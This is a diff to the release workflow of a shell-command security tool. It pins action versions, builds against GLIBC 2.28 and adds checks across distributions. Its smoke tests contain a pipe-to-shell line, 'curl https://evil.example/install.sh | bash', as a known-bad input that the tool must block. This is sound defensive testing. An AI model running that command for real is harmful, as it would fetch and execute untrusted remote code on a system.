@@ -3,12 +3,21 @@ name: Release
 on:
   push:
     tags: ["v*"]
+  pull_request:
+    paths:
+      - ".github/workflows/release.yml"
+      - ".github/scripts/smoke-linux-release.sh"
+      - ".github/scripts/verify-glibc-compat.sh"
+      - "Cargo.lock"
+      - "Cargo.toml"
+      - "crates/tirith/**"
+      - "crates/tirith-core/**"
+      - "packaging/**"
+      - "shell/**"
+  # Manual dispatch builds and smoke-tests only. It takes no inputs on purpose:
+  # every publishing job requires `github.event_name == 'push'`, so no dispatch
+  # option could enable publication and offering one would only imply otherwise.
   workflow_dispatch:
-    inputs:
-      dry_run:
-        description: "Build and smoke-test only (no publish)"
-        type: boolean
-        default: true
 
 permissions:
   contents: read
@@ -26,7 +35,7 @@ jobs:
     name: Verify Enforcement Mode
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
       - uses: dtolnay/rust-toolchain@3c5f7ea28cd621ae0bf5283f0e981fb97b8a7af9 # master
@@ -58,7 +67,7 @@ jobs:
     needs: enforcement-check
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
       - uses: dtolnay/rust-toolchain@3c5f7ea28cd621ae0bf5283f0e981fb97b8a7af9 # master
@@ -80,7 +89,7 @@ jobs:
           ./target/release/tirith manpage > staging/man/tirith.1
 
       - name: Upload completions artifact
-        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
         with:
           name: completions-man
           path: staging/
@@ -100,7 +109,7 @@ jobs:
           - { os: ubuntu-22.04, target: aarch64-unknown-linux-musl }
           - { os: windows-latest, target: x86_64-pc-windows-msvc }
     steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
 
@@ -109,12 +118,51 @@ jobs:
           toolchain: "1.97.0"
           targets: ${{ matrix.target }}
 
-      - name: Install cross-compilation tools (Linux aarch64 gnu)
-        if: matrix.target == 'aarch64-unknown-linux-gnu'
+      # Build the GNU artifacts with a verified Zig 0.13.0 toolchain and
+      # cargo-zigbuild 0.19.8. The `.2.28` target suffix below makes the GNU
+      # symbol ceiling explicit instead of inheriting ubuntu-22.04's glibc.
+      # GLIBC 2.28 is the honest floor: Tirith and Rust's standard library use
+      # memfd_create/statx, so a 2.17 sysroot does not link without a risky
+      # syscall shim. EL8 itself ships 2.28, so no target platform needs that
+      # extra compatibility layer.
+      - name: Install verified Zig and cargo-zigbuild (Linux gnu)
+        if: endsWith(matrix.target, '-unknown-linux-gnu')
+        env:
+          CARGO_ZIGBUILD_VERSION: "0.19.8"
+          CARGO_ZIGBUILD_SHA256: 72cc1bd7d42819641db917977b0a7025c9e95e1cc7d19bab79af4a875b5eaa6e
+          ZIG_VERSION: "0.13.0"
+          ZIG_SHA256: d45312e61ebcc48032b77bc4cf7fd6915c11fa16e4aad116b66c9468211230ea
         run: |
-          sudo apt-get update
-          sudo apt-get install -y gcc-aarch64-linux-gnu
-          echo "CARGO_TARGET_AARCH64_UNKNOWN_LINUX_GNU_LINKER=aarch64-linux-gnu-gcc" >> $GITHUB_ENV
+          set -euo pipefail
+          cargo_zigbuild_archive="${RUNNER_TEMP}/cargo-zigbuild-${CARGO_ZIGBUILD_VERSION}.crate"
+          cargo_zigbuild_source="${RUNNER_TEMP}/cargo-zigbuild-source"
+          cargo_zigbuild_root="${RUNNER_TEMP}/cargo-zigbuild-install"
+          zig_archive="${RUNNER_TEMP}/zig-linux-x86_64-${ZIG_VERSION}.tar.xz"
+          zig_root="${RUNNER_TEMP}/zig-${ZIG_VERSION}"
+
+          curl --proto '=https' --tlsv1.2 -fsSL \
+            "https://static.crates.io/crates/cargo-zigbuild/cargo-zigbuild-${CARGO_ZIGBUILD_VERSION}.crate" \
+            -o "$cargo_zigbuild_archive"
+          printf '%s  %s\n' "$CARGO_ZIGBUILD_SHA256" "$cargo_zigbuild_archive" \
+            | sha256sum --check --strict
+          mkdir -p "$cargo_zigbuild_source" "$cargo_zigbuild_root"
+          tar xzf "$cargo_zigbuild_archive" -C "$cargo_zigbuild_source"
+          cargo install --locked \
+            --path "$cargo_zigbuild_source/cargo-zigbuild-${CARGO_ZIGBUILD_VERSION}" \
+            --root "$cargo_zigbuild_root"
+
+          curl --proto '=https' --tlsv1.2 -fsSL \
+            "https://ziglang.org/download/${ZIG_VERSION}/zig-linux-x86_64-${ZIG_VERSION}.tar.xz" \
+            -o "$zig_archive"
+          printf '%s  %s\n' "$ZIG_SHA256" "$zig_archive" | sha256sum --check --strict
+          mkdir -p "$zig_root"
+          tar xJf "$zig_archive" --strip-components=1 -C "$zig_root"
+
+          "$cargo_zigbuild_root/bin/cargo-zigbuild" --version \
+            | grep -Fx "cargo-zigbuild ${CARGO_ZIGBUILD_VERSION}"
+          "$zig_root/zig" version | grep -Fx "$ZIG_VERSION"
+          echo "$cargo_zigbuild_root/bin" >> "$GITHUB_PATH"
+          echo "$zig_root" >> "$GITHUB_PATH"
 
       - name: Install cross-compilation tools (Linux aarch64 musl)
         if: matrix.target == 'aarch64-unknown-linux-musl'
@@ -125,7 +173,14 @@ jobs:
           echo "AR_aarch64_unknown_linux_musl=aarch64-linux-gnu-ar" >> $GITHUB_ENV
           echo "CARGO_TARGET_AARCH64_UNKNOWN_LINUX_MUSL_LINKER=aarch64-linux-gnu-gcc" >> $GITHUB_ENV
 
-      - name: Build release binary
+      - name: Build release binaries (Linux gnu, GLIBC 2.28 ceiling)
+        if: endsWith(matrix.target, '-unknown-linux-gnu')
+        run: >-
+          cargo zigbuild --release --locked --bins
+          --target ${{ matrix.target }}.2.28 -p tirith
+
+      - name: Build release binaries
+        if: ${{ !endsWith(matrix.target, '-unknown-linux-gnu') }}
         run: cargo build --release --locked --target ${{ matrix.target }} -p tirith
 
       # The aarch64 musl artifact ships for Android/Termux (Bionic libc cannot
@@ -156,16 +211,59 @@ jobs:
             echo "ERROR: 'tirith --version' did not run under QEMU"
             exit 1
           }
-          # Verify a real analysis path: a known-bad command must exit non-zero.
-          if qemu-aarch64-static "$BIN" check -- "curl https://evil.com | bash"; then
-            echo "ERROR: musl binary failed to block a pipe-to-shell command"
+          # Verify a real analysis path and its exact contract. Any other
+          # non-zero (loader failure, signal, or CLI misuse) is a failed smoke.
+          set +e
+          BLOCK_OUTPUT=$(qemu-aarch64-static "$BIN" check --non-interactive \
+            --shell posix -- "curl https://evil.example/install.sh | bash" 2>&1)
+          BLOCK_RC=$?
+          set -e
+          if [ "$BLOCK_RC" -ne 1 ]; then
+            echo "ERROR: musl block smoke returned $BLOCK_RC; expected exactly 1"
+            echo "$BLOCK_OUTPUT"
             exit 1
           fi
+          echo "$BLOCK_OUTPUT" | grep -q 'tirith: BLOCKED'
+
+          # The aarch64 musl build has the same explicit seccomp limitation as
+          # the GNU build. It must refuse a locked-down capsule before launch,
+          # never silently run with Landlock alone while claiming raw-network
+          # denial. Keep this proof on the actual static release executable.
+          CAPSULE_STATE=$(mktemp -d)
+          trap 'rm -rf -- "$CAPSULE_STATE"' EXIT
+          mkdir -p "$CAPSULE_STATE/project" "$CAPSULE_STATE/home" \
+            "$CAPSULE_STATE/config" "$CAPSULE_STATE/data" "$CAPSULE_STATE/state"
+          printf 'release capsule fixture\n' > "$CAPSULE_STATE/project/README.txt"
+          set +e
+          CAPSULE_OUTPUT=$(env \
+            HOME="$CAPSULE_STATE/home" \
+            XDG_CONFIG_HOME="$CAPSULE_STATE/config" \
+            XDG_DATA_HOME="$CAPSULE_STATE/data" \
+            XDG_STATE_HOME="$CAPSULE_STATE/state" \
+            TIRITH_LOG=0 \
+            qemu-aarch64-static "$BIN" capsule run \
+              --project "$CAPSULE_STATE/project" -- \
+              /bin/echo TIRITH_CAPSULE_CHILD_MUST_NOT_RUN 2>&1)
+          CAPSULE_RC=$?
+          set -e
+          if [ "$CAPSULE_RC" -ne 1 ]; then
+            echo "ERROR: aarch64 musl capsule returned $CAPSULE_RC; expected 1"
+            echo "$CAPSULE_OUTPUT"
+            exit 1
+          fi
+          if echo "$CAPSULE_OUTPUT" | grep -q 'TIRITH_CAPSULE_CHILD_MUST_NOT_RUN'; then
+            echo "ERROR: aarch64 musl capsule launched its child without seccomp"
+            echo "$CAPSULE_OUTPUT"
+            exit 1
+          fi
+          echo "$CAPSULE_OUTPUT" \
+            | grep -Fq 'REFUSED before launch (nothing was copied or spawned)'
+          echo "$CAPSULE_OUTPUT" | grep -Fq 'missing: network_raw_denied'
           echo "musl artifact smoke test passed"
 
       - name: Download completions (Unix)
         if: runner.os != 'Windows'
-        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
         with:
           name: completions-man
           path: staging/
@@ -174,15 +272,30 @@ jobs:
         if: runner.os != 'Windows'
         run: |
           cp target/${{ matrix.target }}/release/tirith staging/
-          if [ "${{ matrix.target }}" = "x86_64-unknown-linux-gnu" ] || \
+          if [[ "${{ matrix.target }}" == *-unknown-linux-gnu ]] || \
              [ "${{ matrix.target }}" = "x86_64-unknown-linux-musl" ]; then
             cp target/${{ matrix.target }}/release/tirith-package-approval-authority staging/
             test -x staging/tirith-package-approval-authority
           fi
 
+      - name: Verify every staged GNU ELF stays at GLIBC 2.28 (Linux gnu)
+        if: endsWith(matrix.target, '-unknown-linux-gnu')
+        env:
+          TARGET: ${{ matrix.target }}
+        run: |
+          set -euo pipefail
+          case "$TARGET" in
+            x86_64-*) ARCH=x86_64 ;;
+            aarch64-*) ARCH=aarch64 ;;
+            *) echo "ERROR: unsupported GNU release target: $TARGET"; exit 1 ;;
+          esac
+          test -x staging/tirith
+          test -x staging/tirith-package-approval-authority
+          bash .github/scripts/verify-glibc-compat.sh "$ARCH" 2.28 staging
+
       - name: Download completions (Windows)
         if: runner.os == 'Windows'
-        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
         with:
           name: completions-man
           path: staging/
@@ -210,7 +323,7 @@ jobs:
           Compress-Archive -Path tirith.exe, completions, man -DestinationPath ..\tirith-${{ matrix.target }}.zip
 
       - name: Upload artifact
-        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
         with:
           name: tirith-${{ matrix.target }}
           path: tirith-${{ matrix.target }}.*
@@ -228,23 +341,34 @@ jobs:
           - { os: windows-latest, target: x86_64-pc-windows-msvc }
     steps:
       - name: Download artifact
-        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
         with:
           name: tirith-${{ matrix.target }}
 
       - name: Extract and test (Unix)
         if: runner.os != 'Windows'
         run: |
+          set -euo pipefail
           tmpdir=$(mktemp -d)
           tar xzf tirith-${{ matrix.target }}.tar.gz -C "$tmpdir"
           chmod +x "$tmpdir/tirith"
           "$tmpdir/tirith" --version
           "$tmpdir/tirith" doctor
-          "$tmpdir/tirith" check -- "curl https://evil.com | bash" && exit 1 || true
+          set +e
+          block_output=$("$tmpdir/tirith" check --non-interactive --shell posix \
+            -- "curl https://evil.example/install.sh | bash" 2>&1)
+          block_rc=$?
+          set -e
+          if [ "$block_rc" -ne 1 ]; then
+            echo "ERROR: block smoke returned $block_rc; expected exactly 1"
+            echo "$block_output"
+            exit 1
+          fi
+          echo "$block_output" | grep -q 'tirith: BLOCKED'
           if [ "${{ matrix.target }}" = "x86_64-unknown-linux-gnu" ]; then
             test -x "$tmpdir/tirith-package-approval-authority"
           fi
-          "$tmpdir/tirith" check -- "ls -la"
+          "$tmpdir/tirith" check --non-interactive --shell posix -- "printf release-smoke"
           rm -rf "$tmpdir"
 
       - name: Extract and test (Windows)
@@ -261,6 +385,102 @@ jobs:
           if ($LASTEXITCODE -ne 0) { exit 1 }
           Remove-Item -Recurse -Force $tmpdir -ErrorAction SilentlyContinue
 
+  linux-runtime-compat:
+    name: GNU Runtime (${{ matrix.distro }}, ${{ matrix.arch }})
+    needs: build
+    runs-on: ubuntu-22.04
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - distro: almalinux-8
+            arch: x86_64
+            image: "almalinux:8@sha256:4a87d2615a770506e204c27d6248ac97f4df67f4e41e2e9c47c81f0ed0be98cb"
+            glibc: "2.28"
+          - distro: almalinux-8
+            arch: aarch64
+            image: "almalinux:8@sha256:4a87d2615a770506e204c27d6248ac97f4df67f4e41e2e9c47c81f0ed0be98cb"
+            glibc: "2.28"
+          - distro: amazonlinux-2023
+            arch: x86_64
+            image: "amazonlinux:2023@sha256:181f98c48832fe926f8ca3b6ffeafcce128e96e77b93d08fbe9a9bc9403ce284"
+            glibc: "2.34"
+          - distro: amazonlinux-2023
+            arch: aarch64
+            image: "amazonlinux:2023@sha256:181f98c48832fe926f8ca3b6ffeafcce128e96e77b93d08fbe9a9bc9403ce284"
+            glibc: "2.34"
+          - distro: rocky-9
+            arch: x86_64
+            image: "rockylinux/rockylinux:9@sha256:8101994123cf3d0a8fee517bee7f39e555c7d92bd2d9eb3303cc988a0eeed00f"
+            glibc: "2.34"
+          - distro: rocky-9
+            arch: aarch64
+            image: "rockylinux/rockylinux:9@sha256:8101994123cf3d0a8fee517bee7f39e555c7d92bd2d9eb3303cc988a0eeed00f"
+            glibc: "2.34"
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+
+      - name: Resolve target and Docker platform
+        id: runtime_target
+        env:
+          ARCH: ${{ matrix.arch }}
+        run: |
+          set -euo pipefail
+          case "$ARCH" in
+            x86_64)
+              echo "TARGET=x86_64-unknown-linux-gnu" >> "$GITHUB_ENV"
+              echo "DOCKER_PLATFORM=amd64" >> "$GITHUB_ENV"
+              echo "target=x86_64-unknown-linux-gnu" >> "$GITHUB_OUTPUT"
+              ;;
+            aarch64)
+              echo "TARGET=aarch64-unknown-linux-gnu" >> "$GITHUB_ENV"
+              echo "DOCKER_PLATFORM=arm64" >> "$GITHUB_ENV"
+              echo "target=aarch64-unknown-linux-gnu" >> "$GITHUB_OUTPUT"
+              ;;
+            *) echo "ERROR: unsupported runtime architecture: $ARCH"; exit 1 ;;
+          esac
+
+      - name: Set up QEMU for the aarch64 runtime proof
+        if: matrix.arch == 'aarch64'
+        uses: docker/setup-qemu-action@96fe6ef7f33517b61c61be40b68a1882f3264fb8 # v4.2.0
+        with:
+          image: tonistiigi/binfmt:qemu-v9.2.0@sha256:ea2f0dd74e74f101df59f9a6b31d0960994060c7982a921cbceecee0f1841125
+          platforms: arm64
+          cache-image: false
+
+      - name: Download canonical GNU artifact
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
+        with:
+          name: tirith-${{ steps.runtime_target.outputs.target }}
+          path: canonical
+
+      - name: Extract and re-verify the published GNU payload
+        env:
+          ARCH: ${{ matrix.arch }}
+        run: |
+          set -euo pipefail
+          mkdir -p runtime-root
+          tar xzf "canonical/tirith-${TARGET}.tar.gz" -C runtime-root
+          test -x runtime-root/tirith
+          test -x runtime-root/tirith-package-approval-authority
+          bash .github/scripts/verify-glibc-compat.sh "$ARCH" 2.28 runtime-root
+
+      - name: Run exact behavior smoke in the target distribution
+        env:
+          RUNTIME_IMAGE: ${{ matrix.image }}
+          EXPECTED_GLIBC: ${{ matrix.glibc }}
+        run: |
+          set -euo pipefail
+          docker run --rm --platform "linux/${DOCKER_PLATFORM}" \
+            -v "${GITHUB_WORKSPACE}/runtime-root:/opt/tirith-release:ro" \
+            -v "${GITHUB_WORKSPACE}/.github/scripts/smoke-linux-release.sh:/opt/smoke-linux-release.sh:ro" \
+            "$RUNTIME_IMAGE" \
+            /bin/bash /opt/smoke-linux-release.sh "$EXPECTED_GLIBC" \
+              /opt/tirith-release/tirith \
+              /opt/tirith-release/tirith-package-approval-authority
+
   attest-packages:
     name: Attest Linux Packages
     needs: [build-deb, build-rpm]
@@ -272,13 +492,13 @@ jobs:
       id-token: write
     steps:
       - name: Download Debian package
-        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
         with:
           name: tirith-deb
           path: packages
 
       - name: Download RPM package
-        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
         with:
           name: tirith-rpm
           path: packages
@@ -311,7 +531,7 @@ jobs:
           sha256sum -- "$expected_deb" "${rpms[0]}"
 
       - name: Generate package build provenance
-        uses: actions/attest@a1948c3f048ba23858d222213b7c278aabede763 # v4.1.1
+        uses: actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6 # v4.2.2
         with:
           subject-path: |
             packages/*.deb
@@ -342,19 +562,19 @@ jobs:
 
   release:
     name: Create Release
-    needs: [fuzz-gate, smoke-test, build-deb, build-rpm, attest-packages]
+    needs: [fuzz-gate, release-validation, attest-packages]
     if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
     runs-on: ubuntu-latest
     permissions:
       contents: write
       id-token: write
     steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
 
       - name: Download all artifacts
-        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
         with:
           path: artifacts
           merge-multiple: true
@@ -413,7 +633,11 @@ jobs:
           cat checksums.txt
 
       - name: Install cosign
-        uses: sigstore/cosign-installer@398d4b0eeef1380460a10c8013a76f728fb906ac # v3
+        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2
+        with:
+          # Preserve the detached .sig/.pem release contract. Cosign 3 changes
+          # sign-blob to require a bundle and is a separate format migration.
+          cosign-release: v2.6.1
 
       - name: Sign checksums
         run: |
@@ -440,7 +664,7 @@ jobs:
           fi
 
       - name: Create GitHub Release
-        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2
+        uses: softprops/action-gh-release@3d0d9888cb7fd7b750713d6e236d1fcb99157228 # v3.0.2
         with:
           generate_release_notes: true
           files: |
@@ -452,7 +676,7 @@ jobs:
     if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
       - uses: dtolnay/rust-toolchain@3c5f7ea28cd621ae0bf5283f0e981fb97b8a7af9 # master
@@ -509,19 +733,19 @@ jobs:
     if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           path: source
           persist-credentials: false
 
       - name: Download all artifacts
-        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
         with:
           path: artifacts
           merge-multiple: true
 
       - name: Checkout tap repo
-        uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           repository: sheeki03/homebrew-tap
           token: ${{ secrets.TAP_GITHUB_TOKEN }}
@@ -540,12 +764,31 @@ jobs:
           SHA_AL=$(sha256sum tirith-aarch64-unknown-linux-gnu.tar.gz | cut -d' ' -f1)
           SHA_XL=$(sha256sum tirith-x86_64-unknown-linux-gnu.tar.gz | cut -d' ' -f1)
           cd ..
+          # Each sed below replaces the FIRST remaining placeholder, so the
+          # order of the four sha256 lines in the template is load-bearing and
+          # a template edit that drops or reorders one would silently ship a
+          # formula whose bottle hashes belong to the wrong architecture, or a
+          # literal PLACEHOLDER. Assert the count going in and coming out.
+          placeholders=$(grep -c 'sha256 "PLACEHOLDER"' homebrew-tap/Formula/tirith.rb || true)
+          if [ "$placeholders" -ne 4 ]; then
+            echo "ERROR: expected 4 sha256 PLACEHOLDER lines in the formula template, found ${placeholders}" >&2
+            exit 1
+          fi
           sed -i "s/version \"[0-9.]*\"/version \"${VER}\"/" homebrew-tap/Formula/tirith.rb
           sed -i "s|releases/download/v[0-9.]*|releases/download/${VERSION}|g" homebrew-tap/Formula/tirith.rb
           sed -i "0,/sha256 \"PLACEHOLDER\"/{s/sha256 \"PLACEHOLDER\"/sha256 \"${SHA_AA}\"/}" homebrew-tap/Formula/tirith.rb
           sed -i "0,/sha256 \"PLACEHOLDER\"/{s/sha256 \"PLACEHOLDER\"/sha256 \"${SHA_XA}\"/}" homebrew-tap/Formula/tirith.rb
           sed -i "0,/sha256 \"PLACEHOLDER\"/{s/sha256 \"PLACEHOLDER\"/sha256 \"${SHA_AL}\"/}" homebrew-tap/Formula/tirith.rb
           sed -i "0,/sha256 \"PLACEHOLDER\"/{s/sha256 \"PLACEHOLDER\"/sha256 \"${SHA_XL}\"/}" homebrew-tap/Formula/tirith.rb
+          if grep -q 'PLACEHOLDER' homebrew-tap/Formula/tirith.rb; then
+            echo "ERROR: formula still contains a PLACEHOLDER after templating" >&2
+            grep -n 'PLACEHOLDER' homebrew-tap/Formula/tirith.rb >&2
+            exit 1
+          fi
+          if grep -q 'version "0.1.0"' homebrew-tap/Formula/tirith.rb; then
+            echo "ERROR: formula version was not substituted (still the template placeholder)" >&2
+            exit 1
+          fi
 
       - name: Push formula
         env:
@@ -567,17 +810,17 @@ jobs:
       contents: read
       id-token: write  # Required for npm provenance (OIDC)
     steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
 
-      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
+      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
         with:
           node-version: 20
           registry-url: https://registry.npmjs.org
 
       - name: Download all artifacts
-        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
         with:
           path: artifacts
           merge-multiple: true
@@ -679,19 +922,19 @@ jobs:
     if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           path: source
           persist-credentials: false
 
       - name: Download all artifacts
-        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
         with:
           path: artifacts
           merge-multiple: true
 
       - name: Checkout scoop bucket
-        uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           repository: sheeki03/scoop-tirith
           token: ${{ secrets.TAP_GITHUB_TOKEN }}
@@ -711,6 +954,10 @@ jobs:
           # `v[0-9.]*` matched zero digits and produced `v0.3.2$version`).
           sed -i "s|releases/download/v[0-9][0-9.]*|releases/download/${VERSION}|" scoop-tirith/bucket/tirith.json
           sed -i "s/\"hash\": \"PLACEHOLDER\"/\"hash\": \"${HASH}\"/" scoop-tirith/bucket/tirith.json
+          if grep -q 'PLACEHOLDER' scoop-tirith/bucket/tirith.json; then
+            echo "ERROR: scoop manifest still contains a PLACEHOLDER after templating" >&2
+            exit 1
+          fi
 
       - name: Push manifest
         env:
@@ -732,12 +979,12 @@ jobs:
       contents: read
       packages: write
     steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
 
       - name: Download all artifacts
-        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
         with:
           path: artifacts
           merge-multiple: true
@@ -758,13 +1005,13 @@ jobs:
           cp Dockerfile docker-arm64/
 
       - name: Set up QEMU
-        uses: docker/setup-qemu-action@c7c53464625b32c7a7e944ae62b3e17d2b600130 # v3
+        uses: docker/setup-qemu-action@96fe6ef7f33517b61c61be40b68a1882f3264fb8 # v4.2.0
 
       - name: Set up Docker Buildx
-        uses: docker/setup-buildx-action@8d2750c68a42422c14e847fe6c8ac0403b4cbd6f # v3
+        uses: docker/setup-buildx-action@37fe631027851001ddb9b187196cc803df7f5f0e # v4.3.0
 
       - name: Login to GHCR
-        uses: docker/login-action@c94ce9fb468520275223c153574b00df6fe4bcc9 # v3
+        uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f # v4.6.0
         with:
           registry: ghcr.io
           username: ${{ github.actor }}
@@ -775,7 +1022,7 @@ jobs:
         run: echo "VERSION=${GITHUB_REF_NAME#v}" >> $GITHUB_OUTPUT
 
       - name: Build and push (amd64)
-        uses: docker/build-push-action@ca052bb54ab0790a636c9b5f226502c73d547a25 # v5
+        uses: docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a # v7.3.0
         with:
           context: docker-amd64
           platforms: linux/amd64
@@ -783,7 +1030,7 @@ jobs:
           tags: ghcr.io/sheeki03/tirith:${{ steps.version.outputs.VERSION }}-amd64
 
       - name: Build and push (arm64)
-        uses: docker/build-push-action@ca052bb54ab0790a636c9b5f226502c73d547a25 # v5
+        uses: docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a # v7.3.0
         with:
           context: docker-arm64
           platforms: linux/arm64
@@ -803,16 +1050,35 @@ jobs:
   build-deb:
     name: Build Debian Package
     needs: smoke-test
-    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
+    if: >-
+      github.event_name == 'pull_request' ||
+      github.event_name == 'workflow_dispatch' ||
+      (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v'))
     runs-on: ubuntu-22.04
     steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
 
       - uses: dtolnay/rust-toolchain@3c5f7ea28cd621ae0bf5283f0e981fb97b8a7af9 # master
         with:
           toolchain: "1.97.0"
+
+      - name: Resolve package version
+        run: |
+          set -euo pipefail
+          package_version=$(cargo metadata --locked --no-deps --format-version 1 \
+            | jq -r '.packages[] | select(.name == "tirith") | .version')
+          if [[ -z "$package_version" || "$package_version" == "null" ]]; then
+            echo "ERROR: could not resolve the tirith package version"
+            exit 1
+          fi
+          if [[ "$GITHUB_REF" == refs/tags/v* ]] \
+             && [[ "$GITHUB_REF_NAME" != "v${package_version}" ]]; then
+            echo "ERROR: tag $GITHUB_REF_NAME does not match tirith $package_version"
+            exit 1
+          fi
+          echo "PACKAGE_VERSION=$package_version" >> "$GITHUB_ENV"
 
       - name: Install verified cargo-deb
         env:
@@ -851,10 +1117,16 @@ jobs:
           cp shell/lib/*.ps1 crates/tirith/assets/shell/lib/
 
       - name: Download canonical Linux x64 release artifact
-        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
         with:
           name: tirith-x86_64-unknown-linux-gnu
           path: canonical
+
+      - name: Download generated completions and manpage
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
+        with:
+          name: completions-man
+          path: package-metadata
 
       # Package the SAME binary that ships in the tarball and that `tirith
       # verify-self` compares against, instead of a separate rebuild. A separate
@@ -871,54 +1143,71 @@ jobs:
           echo "Packaging canonical binary:"
           sha256sum crates/tirith/target/release/tirith
 
-      - name: Generate completions and manpage for .deb
+      - name: Stage generated completions and manpage for .deb
         run: |
+          set -euo pipefail
           mkdir -p crates/tirith/assets/completions crates/tirith/assets/man
-          ./crates/tirith/target/release/tirith completions bash > crates/tirith/assets/completions/tirith.bash
